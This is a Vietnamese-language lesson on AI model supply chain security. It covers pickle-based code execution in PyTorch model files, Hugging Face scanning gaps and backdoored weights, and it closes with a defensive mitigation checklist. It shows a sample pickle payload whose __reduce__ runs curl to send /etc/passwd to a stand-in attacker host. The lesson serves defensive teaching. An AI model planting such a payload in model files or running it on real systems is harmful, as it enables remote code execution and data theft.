# Bài 4: AI Model Supply Chain Security — Nguy Hiểm Ẩn Trong Weights

## Vấn đề

Supply chain attack surface cho ML **rộng hơn nhiều** so với traditional software:
- Tổ chức routinely pull model weights từ public repos
- Fine-tune trên proprietary data
- Deploy lên production — thường **không qua security review**

## Pickle Exploitation — Attack Vector #1

**95% malicious ML models target PyTorch's pickle serialization format.**

```python
# Pickle có thể execute arbitrary code khi load
import pickle

class Malicious:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/exfil?data=$(cat /etc/passwd)',))

# Model file = trojan horse
torch.save({"model": malicious_obj}, "model.pt")
# Khi victim load: torch.load("model.pt") → RCE
```

## Hugging Face Risks

- Hugging Face **flags** unsafe models nhưng **không block downloads**
- PickleScan có **7 confirmed bypass vulnerabilities** (JFrog & Sonatype)
- 1,862 MCP servers exposed — 100% cho phép unauthenticated access

## Backdoored Weights

- Model weights có thể chứa backdoors **invisible** cho mọi standard security tool
- Không có provenance, audit trails, signing standards
- Malicious behavior chỉ trigger với specific inputs → gần như không thể detect bằng testing thông thường

## Mitigation Checklist

1. **Không bao giờ dùng pickle format** — Prefer safetensors, ONNX
2. **Verify model provenance** — Check source, author reputation, commit history
3. **Scan trước khi load** — Dù PickleScan có limitations, vẫn catch basic attacks
4. **Isolate model loading** — Container/sandbox riêng cho model inference
5. **Pin model versions** — Giống pin dependency versions
6. **Monitor model behavior** — Statistical monitoring cho output drift

## References

- [Aquilax: AI Model Supply Chain Poisoning](https://aquilax.ai/blog/ai-model-supply-chain-poisoning)
- [BeyondScale: Open Source AI Model Security](https://beyondscale.tech/blog/open-source-ai-model-security-hugging-face)
- [BeyondScale: AI Model Supply Chain Security Checklist](https://beyondscale.tech/blog/ai-model-supply-chain-security)
- [Trend Micro: Exploiting Trust in Open-Source AI](http://www.trendmicro.com/vinfo/it/security/news/cybercrime-and-digital-threats/exploiting-trust-in-open-source-ai-the-hidden-supply-chain-risk-no-one-is-watching)
